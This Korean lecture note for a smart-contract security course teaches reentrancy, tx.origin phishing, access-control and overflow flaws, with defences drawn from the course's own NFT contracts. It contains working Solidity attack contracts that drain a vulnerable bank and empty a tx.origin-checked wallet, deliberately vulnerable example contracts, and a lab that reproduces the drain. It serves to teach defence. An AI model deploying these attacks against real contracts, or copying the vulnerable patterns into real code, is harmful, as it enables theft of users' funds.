# M8 · S43 — 주요 취약점 패턴 : Reentrancy · tx.origin · Access Control

> **강의노트 깊이 기준** : 강사가 50분 수업을 자신있게 소화하기 위한 120분 수준 배경지식 포함.  
> `[강사 배경]` 섹션은 수업 슬라이드에 넣지 않아도 되지만 반드시 숙지해야 하는 내용이다.  
> `[강의]` 표시 항목이 실제 수업에서 설명할 내용이다.

---

## 세션 개요

| 항목 | 내용 |
|---|---|
| 모듈 | M8 — 스마트컨트랙트 보안 |
| 세션 | S43 |
| 전달 시간 | 강의 35분 + 실습 25분 |
| 선행 지식 | S40~S42 (KyoboNFT.sol 구조, UUPS 패턴, ReentrancyGuard 존재 인지) |
| 이 세션의 목표 | 3대 취약점 패턴의 원리와 방어법을 이해하고, NFTIssuer.sol이 왜 안전한지 스스로 설명할 수 있다 |

---

## 이 세션의 핵심 메시지

> **스마트컨트랙트 버그는 되돌릴 수 없다.**  
> 일반 소프트웨어는 패치를 배포하면 된다. 블록체인은 트랜잭션이 확정된 순간 이미 돈이 사라진다.  
> 그래서 보안은 "나중에 추가"가 아니라 설계 단계부터 패턴으로 굳혀야 한다.

---

## [강사 배경] 역사적 사건 — The DAO Hack (2016)

이 사건을 알아야 reentrancy의 심각성을 학생들에게 제대로 전달할 수 있다.

### 사건 개요
- **2016년 6월 17일** : The DAO(Decentralized Autonomous Organization) 컨트랙트가 공격당함
- 피해 금액 : **360만 ETH ≈ 당시 시세 약 6,000만 달러**
- 이더리움 전체 유통 ETH의 **약 15%**
- 결과 : 이더리움 커뮤니티가 하드포크를 결정 → Ethereum / Ethereum Classic으로 분리

### 취약 코드 (단순화)

```solidity
// 2016년 The DAO의 핵심 취약 패턴
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);

    // 1단계: ETH 전송 (외부 호출)
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success);

    // 2단계: 잔액 차감 — 너무 늦다!
    balances[msg.sender] -= _amount;
}
```

**문제**: ETH를 보내는 시점에 `balances`가 아직 갱신되지 않았다.  
공격자의 receive() 함수가 이 순간 다시 `withdraw()`를 호출하면 → `balances[msg.sender] >= _amount` 조건을 또 통과한다.

### 왜 이더리움이 하드포크를 했는가

피해를 본 투자자 구제를 위해 블록 1,920,000에서 상태를 롤백하는 하드포크를 실행했다.  
이 결정에 반대한 일부가 원래 체인(Ethereum Classic, ETC)을 그대로 유지했다.  
이것이 "코드는 법이다(Code is Law)" vs "인간의 판단이 우선이다"의 가장 유명한 충돌이다.

---

## 1. Reentrancy (재진입 공격)

### [강사 배경] EVM 외부 호출 메커니즘

#### `.call{value:}("")` 이 위험한 이유

이더리움에서 ETH를 보내는 방법은 세 가지다.

| 방법 | gas 전달 | 수신 컨트랙트 실행 | 현재 권장 |
|---|---|---|---|
| `transfer(amount)` | 2,300 gas 고정 | fallback/receive 실행 가능하지만 gas 부족으로 실패 가능 | 지양 (EIP-1884 이후 gas 부족 문제 발생) |
| `send(amount)` | 2,300 gas 고정 | 동일 | 지양 |
| `.call{value:amount}("")` | 잔여 gas 전부 전달 | receive/fallback 완전 실행 가능 | **권장이지만 가장 위험** |

`transfer`와 `send`는 2,300 gas 한도 때문에 수신 컨트랙트가 복잡한 로직(저장소 쓰기)을 실행할 수 없어 reentrancy가 사실상 불가능했다.  
그런데 **EIP-1884(2019)**에서 `SLOAD` opcode gas가 200 → 800으로 올라가면서 2,300 gas로도 문제가 생겼다.  
현재 권장은 `.call`이지만, 이게 reentrancy의 주 공격 벡터가 된다.

#### EVM 콜스택 구조

```
외부 EOA
  └─ withdraw() 호출
       ├─ balances 확인 (SLOAD)
       ├─ .call{value:}("") ← 여기서 제어권이 수신자에게 넘어감
       │    └─ 공격자 receive() 실행
       │         └─ withdraw() 재호출 ← 재진입!
       │              ├─ balances 확인 (아직 갱신 안 됨)
       │              ├─ .call{value:}("") 다시 실행
       │              │    └─ receive() 또 실행 (가스 허용하는 한 반복)
       │              └─ ...
       └─ balances 차감 (SSTORE) ← 이미 너무 늦음
```

**핵심**: EVM은 단일 스레드이지만, 외부 호출 중에 콜스택이 깊어지면 같은 컨트랙트 함수가 재진입될 수 있다.

### [강의] Reentrancy 공격 전체 흐름

#### 취약한 컨트랙트

```solidity
// ❌ VulnerableBank — Reentrancy 취약
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        // 1단계: 외부 호출 (ETH 전송) — 여기서 제어권 이탈
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        // 2단계: 잔액 차감 — 이미 여러 번 인출된 후
        balances[msg.sender] = 0;
    }
}
```

#### 공격자 컨트랙트

```solidity
// 공격자 컨트랙트
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // ETH 받을 때마다 자동 실행
    receive() external payable {
        attackCount++;
        // 은행에 ETH가 남아있고 재귀 횟수 제한 안에 있으면 재진입
        if (address(bank).balance >= 1 ether && attackCount < 5) {
            bank.withdraw();
        }
    }
}
```

**공격 시나리오**:
1. 공격자: 1 ETH 예치 → `balances[attacker] = 1 ETH`
2. 공격자: `withdraw()` 호출
3. 은행: `amount = 1 ETH`, `.call{value: 1 ETH}` 실행
4. 공격자 `receive()` 자동 실행 → 다시 `withdraw()` 호출
5. 은행: `balances[attacker]`이 아직 `1 ETH` → `amount = 1 ETH`, 다시 전송
6. 5번 반복 → 공격자는 1 ETH 예치로 5 ETH 인출

#### [강사 배경] Reentrancy 변형 패턴들

**단일 함수 Reentrancy** (위 예시): 같은 함수 재진입  
**교차 함수 Reentrancy (Cross-function)**: 다른 함수로 재진입

```solidity
// ❌ 교차 함수 reentrancy
contract CrossFunctionVulnerable {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount);
        balances[to] += amount;
        balances[msg.sender] -= amount;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}(""); // 외부 호출
        require(ok);
        balances[msg.sender] = 0;

        // 공격자가 receive()에서 transfer()를 호출하면?
        // balances[attacker]가 아직 0이 아님 → transfer() 실행 가능
    }
}
```

**읽기 전용 Reentrancy (Read-only Reentrancy)**: 상태를 바꾸지 않는 함수를 재진입  
→ DeFi에서 오라클 가격 조작에 사용. 2023년 Curve Finance 버그와 연관.

**ERC-721 Reentrancy via safeTransferFrom**:
```solidity
// safeTransferFrom → onERC721Received 콜백 → 재진입 가능
// NFT 마켓플레이스에서 실제로 발생한 취약점 패턴
```

### [강의] 방어 방법 1 : CEI 패턴

**CEI = Checks → Effects → Interactions**

```solidity
// ✅ CEI 패턴 적용
function withdraw() external {
    // [Checks] 조건 검증
    uint256 amount = balances[msg.sender];
    require(amount > 0, "nothing to withdraw");

    // [Effects] 상태 먼저 변경
    balances[msg.sender] = 0;

    // [Interactions] 외부 호출 마지막
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}
```

외부 호출이 재진입되더라도 `balances[msg.sender]`가 이미 0이라서 `require`에서 막힌다.

### [강의] 방어 방법 2 : ReentrancyGuard

OpenZeppelin `ReentrancyGuard`의 내부 구현:

```solidity
// OZ ReentrancyGuard 핵심 (단순화)
abstract contract ReentrancyGuard {
    uint256 private _status; // 1 = not entered, 2 = entered

    modifier nonReentrant() {
        require(_status != 2, "ReentrancyGuard: reentrant call");
        _status = 2;
        _;
        _status = 1;
    }
}
```

함수 진입 시 `_status = 2`(잠금), 종료 시 `_status = 1`(해제).  
재진입 시도 → `_status == 2` → revert.

**gas 비용**: `_status` SLOAD(800) + SSTORE(5,000~20,000) ≈ 추가 ~21,000 gas  
교차 함수 reentrancy까지 막으려면 관련 모든 함수에 `nonReentrant` 적용 필요.

### [강의] NFTIssuer는 왜 안전한가

```solidity
// NFTIssuer.sol (실제 코드)
contract NFTIssuer is AccessControl, ReentrancyGuard {
    function issueNFT(...) external onlyRole(OPERATOR_ROLE) nonReentrant {
        require(!issued[requestId], "NFTIssuer: already issued");
        require(oracle.verify(oracleData), "NFTIssuer: invalid oracle data");

        issued[requestId] = true;    // [Effects] 먼저 상태 변경 (CEI)

        nft.mint(to, tokenId, amount);  // [Interactions] 외부 호출

        emit Issued(to, tokenId, oracleData.dataType);
    }
}
```

**방어 층위**:
1. `nonReentrant` — ReentrancyGuard 뮤텍스
2. `issued[requestId] = true` — CEI 패턴 (Effects 먼저)
3. `onlyRole(OPERATOR_ROLE)` — 공격자는 이 함수 자체를 호출 불가

**학생 질문 예상**: "NFT는 ETH를 전송하지 않는데 왜 ReentrancyGuard가 필요한가?"  
→ `nft.mint()`가 외부 컨트랙트 호출임. KyoboNFT가 향후 업그레이드되거나, ERC-1155의 `safeTransferFrom`이 `onERC1155Received` 콜백을 트리거할 수 있음. 방어적으로 적용.

### [강사 배경] ERC-1155와 Reentrancy

KyoboNFT는 ERC-1155를 상속한다. ERC-1155의 `safeTransferFrom` / `safeBatchTransferFrom`은 수신자가 컨트랙트이면 `onERC1155Received` / `onERC1155BatchReceived`를 호출한다.

```solidity
// ERC-1155 내부 (OZ 구현)
function _safeTransferFrom(...) internal {
    // 상태 변경 먼저
    _balances[id][from] -= amount;
    _balances[id][to] += amount;

    emit TransferSingle(operator, from, to, id, amount);

    // 수신자가 컨트랙트면 콜백 호출 ← 재진입 가능 지점
    _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);
}
```

OZ는 내부적으로 CEI를 적용(`_balances` 먼저 변경 후 콜백)하므로 기본 구현은 안전하다.  
하지만 `_update` 훅을 override할 때 이 순서를 깨면 위험해진다.

---

## 2. tx.origin 피싱 공격

### [강사 배경] msg.sender vs tx.origin 완전 정리

| 변수 | 값 | 변경 여부 |
|---|---|---|
| `tx.origin` | 트랜잭션을 처음 서명한 EOA (외부 계정) | 체인 전체에서 불변 |
| `msg.sender` | 현재 함수를 직접 호출한 주소 (EOA 또는 컨트랙트) | 호출 단계마다 변경됨 |

```
[EOA 0xAlice]
    → 트랜잭션 서명 및 전송
        → [PhishingContract] 호출됨
            → [VictimContract.withdraw()] 호출
                ├─ tx.origin = 0xAlice (처음부터 끝까지 EOA)
                └─ msg.sender = PhishingContract (현재 호출자)
```

### [강의] 피싱 공격 시나리오

#### 피해자 컨트랙트 (취약)

```solidity
// ❌ tx.origin으로 인증하는 취약한 지갑
contract VulnerableWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw(address payable _to, uint256 _amount) external {
        // tx.origin은 항상 EOA → 피싱 컨트랙트를 거쳐도 통과!
        require(tx.origin == owner, "not owner");
        _to.transfer(_amount);
    }
}
```

#### 공격자가 배포한 피싱 컨트랙트

```solidity
// 공격자가 배포. 피해자에게 "에어드랍 받으려면 이 컨트랙트를 실행하세요" 유도
contract PhishingContract {
    address payable public attacker;
    VulnerableWallet public wallet;

    constructor(address _wallet) {
        attacker = payable(msg.sender);
        wallet = VulnerableWallet(_wallet);
    }

    // 피해자가 이 함수를 실행하는 순간
    function claimAirdrop() external {
        // tx.origin = 피해자(EOA) — 조건 통과!
        // msg.sender = PhishingContract — 하지만 체크 안 함
        wallet.withdraw(attacker, address(wallet).balance);
    }
}
```

**공격 흐름**:
1. 공격자: PhishingContract 배포, 주소 공개
2. 피해자: "에어드랍" 미끼에 속아 `claimAirdrop()` 직접 호출
3. `tx.origin = 피해자`, `msg.sender = PhishingContract`
4. VulnerableWallet: `tx.origin == owner` 통과 → 전액 인출

### [강의] 방어법

```solidity
// ✅ msg.sender를 사용해야 한다
function withdraw(address payable _to, uint256 _amount) external {
    require(msg.sender == owner, "not owner");
    _to.transfer(_amount);
}
```

`msg.sender`를 쓰면 PhishingContract가 호출할 때 `msg.sender = PhishingContract ≠ owner`이므로 revert.

### [강사 배경] tx.origin의 정당한 용도

**Anti-pattern**: 인증 목적으로 tx.origin 사용 → 절대 금지  
**정당한 용도** (드물게):

| 용도 | 설명 |
|---|---|
| 컨트랙트에서의 호출 감지 | `tx.origin != msg.sender`면 컨트랙트가 호출 중 |
| 가스 환불 메커니즘 | 트랜잭션 시작자에게 가스 환불할 때 |
| 포렌식/분석 | 온체인 이벤트에서 최초 서명자 추적 (but 이것도 보통 이벤트로 처리) |

**메타트랜잭션/Relayer와 tx.origin 문제**:  
Relayer가 대신 tx를 전송하면 `tx.origin = Relayer EOA`, `msg.sender = Relayer EOA`가 된다.  
EIP-2771 (Trusted Forwarder) 패턴은 이를 해결하기 위해 calldata에 원래 sender를 인코딩한다.  
→ Relayer 환경에서 `tx.origin`에 의존하면 Relayer 자신이 "owner"가 되어버린다.

### [강사 배경] Slither 탐지

Slither는 `tx.origin` 사용을 `dangerous-tx.origin` 디텍터로 자동 탐지한다.  
다음 세션 S44에서 Slither를 실행하면 이 패턴이 HIGH 또는 MEDIUM으로 보고된다.

---

## 3. Access Control 취약점

### [강사 배경] Access Control 취약점의 분류

| 유형 | 설명 | 예시 |
|---|---|---|
| 미인증 함수 | `onlyRole` / `onlyOwner` 누락 | `initialize()` 재호출 가능 |
| 잘못된 역할 설계 | 과도한 권한 집중, 1-of-N 구조 | 관리자 개인키 분실 → 영구 lock |
| 역할 이전 버그 | 2단계 이전 없이 단방향 이전 | 오타로 주소 잘못 지정 → 관리 불가 |
| 초기화 취약점 | `initialize()` 보호 누락 | 배포 후 제3자가 initialize 탈취 |
| 프록시 충돌 | 프록시의 관리 함수와 로직 충돌 | upgradeTo가 노출된 경우 |

### [강의] 유형 1 : 미인증 함수

```solidity
// ❌ onlyRole 누락
contract VulnerableNFT {
    mapping(address => bool) public minters;

    // 이 함수를 누구나 호출 가능
    function addMinter(address account) external {
        minters[account] = true;
    }

    function mint(address to, uint256 id) external {
        require(minters[msg.sender], "not minter");
        // mint logic...
    }
}
```

누구나 자신을 Minter로 등록 후 무제한 발행 가능.

```solidity
// ✅ 수정
function addMinter(address account) external onlyRole(DEFAULT_ADMIN_ROLE) {
    grantRole(MINTER_ROLE, account);
}
```

### [강의] 유형 2 : 초기화 함수 보호 누락

```solidity
// ❌ UUPS 컨트랙트에서 initialize 재호출 가능
contract VulnerableUpgradeable is UUPSUpgradeable {
    address public admin;

    // initializer 없이 public — 배포 후 제3자가 admin을 교체 가능!
    function initialize(address _admin) public {
        admin = _admin;
    }
}
```

S42에서 배운 `initializer` 모디파이어가 이를 방어한다.

```solidity
// ✅ OZ initializer 적용
function initialize(address _admin) public initializer {
    admin = _admin;
}
```

`initializer`는 `_initialized` 플래그로 1회만 실행을 보장한다.

### [강의] 유형 3 : 중앙화 위험 (Centralization Risk)

```solidity
// ❌ 단일 EOA가 모든 권한 보유
contract Ownable {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // 이 EOA의 개인키가 유출되면? 전체 시스템 장악
    function pause() external onlyOwner { ... }
    function upgrade() external onlyOwner { ... }
    function mint(address to, uint256 amount) external onlyOwner { ... }
}
```

**실제 사례**: Ronin Bridge (2022, 약 6억 달러) — Validator 9개 중 5개의 개인키가 한 공격자에게 탈취.

**방어 방법**:
- **Gnosis Safe (Multi-sig)**: M-of-N 서명 필요. S46에서 상세 다룸
- **TimeLock**: 권한 있는 작업을 N일 지연 후 실행 (사용자가 대피할 시간 확보)
- **역할 분리**: MINTER ≠ PAUSER ≠ UPGRADER ≠ ADMIN

### [강의] KyoboNFT 역할 설계 검토

```solidity
// KyoboNFT.sol — 역할 분리
bytes32 public constant MINTER_ROLE   = keccak256("MINTER_ROLE");
bytes32 public constant PAUSER_ROLE   = keccak256("PAUSER_ROLE");
bytes32 public constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");
```

| 역할 | 권한 | 보유자 |
|---|---|---|
| `DEFAULT_ADMIN_ROLE` | 역할 부여/해제 | Gnosis Safe (M9에서 이전 예정) |
| `MINTER_ROLE` | mint / mintBatch 호출 | NFTIssuer 컨트랙트 |
| `PAUSER_ROLE` | pause / unpause | 운영팀 EOA |
| `UPGRADER_ROLE` | 업그레이드 승인 | 개발팀 Multi-sig |

NFTIssuer가 MINTER가 되므로, 사람이 직접 KyoboNFT.mint를 부르지 못한다.  
→ Access Control의 단일 게이트웨이 패턴.

### [강사 배경] Access Control 취약점과 Slither

Slither 디텍터 관련 항목:

| Slither 디텍터 | 심각도 | 탐지 내용 |
|---|---|---|
| `suicidal` | HIGH | selfdestruct 무단 호출 가능 |
| `unprotected-upgrade` | HIGH | upgradeTo 인증 없음 |
| `missing-zero-check` | MEDIUM | address(0) 검증 누락 |
| `centralization-risk` | INFORMATIONAL | 단일 주소 과도한 권한 |
| `tx-origin` | MEDIUM | tx.origin 인증 사용 |

---

## 4. Integer Overflow / Underflow

### [강사 배경] Solidity 0.8.0 이전과 이후

**0.8.0 이전**:
```solidity
uint256 x = 0;
x -= 1; // 0 - 1 = 2^256 - 1 (underflow, 오류 없음!)
```

`SafeMath` 라이브러리 (`add`, `sub`, `mul`)를 직접 사용해야 했다.

**0.8.0 이후**:
```solidity
uint256 x = 0;
x -= 1; // Panic: arithmetic underflow — 자동 revert
```

기본적으로 overflow/underflow 시 자동 revert. SafeMath 불필요.

### [강의] unchecked 블록 주의

```solidity
// ✅ 정상 — overflow 체크됨
function decrement(uint256 x) external pure returns (uint256) {
    return x - 1; // x==0이면 revert
}

// ⚠️ unchecked 사용 시 개발자가 직접 보장해야 함
function fastDecrement(uint256 x) external pure returns (uint256) {
    unchecked {
        return x - 1; // x==0이면 wraps around! 검증 없음
    }
}
```

**unchecked 정당한 사용처**: gas 최적화가 중요한 루프 카운터  
```solidity
for (uint256 i = 0; i < length; ) {
    // 로직...
    unchecked { ++i; } // i < length 보장되므로 overflow 불가 → gas 절약
}
```

**잘못된 unchecked 사용**:
```solidity
// ❌ 
function burn(uint256 amount) external {
    unchecked {
        balances[msg.sender] -= amount; // amount > balances이면 underflow
    }
}
```

---

## 5. 취약점 분류표 — Phase 1 적용 기준

| 취약점 | Phase 1 코드 현황 | 방어 수단 |
|---|---|---|
| Reentrancy | NFTIssuer: `nonReentrant` + CEI 적용됨 | ReentrancyGuard + CEI |
| tx.origin | 코드 내 tx.origin 미사용 | msg.sender만 사용 |
| Access Control — 미인증 함수 | MINTER/PAUSER/UPGRADER 역할 분리됨 | AccessControl |
| Access Control — 초기화 취약점 | `initializer` 모디파이어 적용됨 | OZ initializer |
| Access Control — 중앙화 위험 | DEFAULT_ADMIN 단일 EOA (Phase 1 한계) | M9에서 Gnosis Safe 이전 예정 |
| Integer Overflow | Solidity 0.8.20 — 자동 보호 | 컴파일러 기본 |
| unchecked 오용 | unchecked 미사용 | 사용하지 않음 |

---

## 6. 보안 설계 원칙 요약

| 원칙 | 구체 방법 |
|---|---|
| **CEI 패턴** | Check → Effect → Interact 순서 엄수 |
| **Mutex** | 중요 함수에 `nonReentrant` 적용 |
| **최소 권한** | 역할별 최소 권한만 부여, 역할 분리 |
| **msg.sender만** | tx.origin 인증 사용 절대 금지 |
| **단일 게이트웨이** | 외부 접근 경로 단일화 (NFTIssuer 패턴) |
| **Idempotency Key** | `issued[requestId]` 패턴으로 중복 실행 방지 |
| **Multi-sig** | 관리 권한은 개인키 단일 EOA가 아닌 Gnosis Safe |

---

## [실습] 25분

### 목표

Reentrancy 취약 컨트랙트를 직접 공격하고, CEI + ReentrancyGuard 두 가지 방어를 각각 적용해 검증한다.

### Step 1 : 취약 컨트랙트 배포 + 공격 재현 (10분)

Remix에서 두 컨트랙트 배포 후 공격 실행

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ① 취약한 은행 컨트랙트
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing");

        (bool ok, ) = msg.sender.call{value: amount}(""); // 외부 호출 먼저
        require(ok);

        balances[msg.sender] = 0; // 상태 변경 나중 — 취약!
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ② 공격자 컨트랙트
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "send 1 eth");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        attackCount++;
        if (address(bank).balance >= 1 ether && attackCount < 3) {
            bank.withdraw();
        }
    }

    function stolenAmount() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**실습 순서**:
1. VulnerableBank 배포 → 3개의 다른 주소에서 1 ETH씩 예치 (총 3 ETH)
2. Attacker 배포 (VulnerableBank 주소 전달)
3. Attacker.attack() 실행 (1 ETH와 함께)
4. `bank.getBalance()` → 0 확인
5. `attacker.stolenAmount()` → ~3 ETH 확인

### Step 2 : CEI 패턴으로 방어 (8분)

```solidity
contract SecureBank_CEI {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing");

        balances[msg.sender] = 0;              // [Effects] 먼저
        (bool ok, ) = msg.sender.call{value: amount}(""); // [Interactions] 나중
        require(ok);
    }
}
```

**실습 순서**:
1. SecureBank_CEI 배포 → 3 ETH 예치
2. 기존 Attacker 주소를 SecureBank_CEI로 교체 (Attacker 재배포 or `bank` 직접 수정)
3. attack() 실행 → `attackCount == 1` 후 revert 확인
4. 은행 잔액 여전히 3 ETH 확인

### Step 3 : ReentrancyGuard 방어 확인 (7분)

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureBank_Guard is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // nonReentrant 추가만으로 방어 (CEI 없이도)
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing");

        (bool ok, ) = msg.sender.call{value: amount}(""); // 순서가 틀려도
        require(ok);

        balances[msg.sender] = 0;
    }
}
```

- 공격 시도 → `ReentrancyGuard: reentrant call`로 revert 확인
- 결론: **둘 다 쓰는 게 최선** (CEI는 로직 명확화, Guard는 명시적 뮤텍스)

---

## 강의 진행 순서 (50분 기준)

| 시간 | 내용 | 슬라이드 포인트 |
|---|---|---|
| 0~5분 | 오프닝: The DAO 해킹 사건 1분 설명 | "2016년 6천만 달러가 사라졌다" |
| 5~15분 | Reentrancy 원리 + 공격 코드 리뷰 | VulnerableBank 코드 라인별 설명 |
| 15~22분 | CEI 패턴 + ReentrancyGuard 방어 | NFTIssuer.sol 코드 비교 |
| 22~30분 | tx.origin 피싱 + msg.sender 비교 | 콜스택 다이어그램 |
| 30~35분 | Access Control 3가지 유형 + KyoboNFT 설계 검토 | 역할 테이블 |
| 35~60분 | 실습: 공격 재현 → CEI → Guard 순서 | Remix에서 직접 실행 |

---

## 다음 세션 예고 (S44)

S44에서는 Slither 정적 분석 도구를 실행해서 Phase 1 코드 전체를 자동 검사한다.  
`tx.origin`, `missing-zero-check`, `reentrancy` 등을 Slither가 자동으로 잡아내는 과정을 보게 된다.  
오늘 배운 취약점 이름을 Slither 리포트에서 그대로 확인할 수 있다.

---

## 핵심 용어 정리

| 용어 | 한 줄 정의 |
|---|---|
| Reentrancy | 외부 호출 중 같은 컨트랙트로 재진입해 상태 불일치를 악용하는 공격 |
| CEI 패턴 | Check → Effect → Interact 순서로 상태를 먼저 변경하는 설계 패턴 |
| ReentrancyGuard | 함수 진입 시 뮤텍스를 걸어 재진입을 원천 차단하는 OZ 추상 컨트랙트 |
| tx.origin | 트랜잭션에 최초 서명한 EOA 주소 — 인증 용도 사용 금지 |
| msg.sender | 현재 함수를 직접 호출한 주소 (EOA 또는 컨트랙트) |
| 중앙화 위험 | 단일 주소에 과도한 권한이 집중된 구조 — Gnosis Safe로 완화 |
| nonReentrant | OZ ReentrancyGuard의 modifier — 재진입 차단 |
| The DAO Hack | 2016년 Reentrancy 취약점으로 6천만 달러 피해, 이더리움 하드포크 원인 |
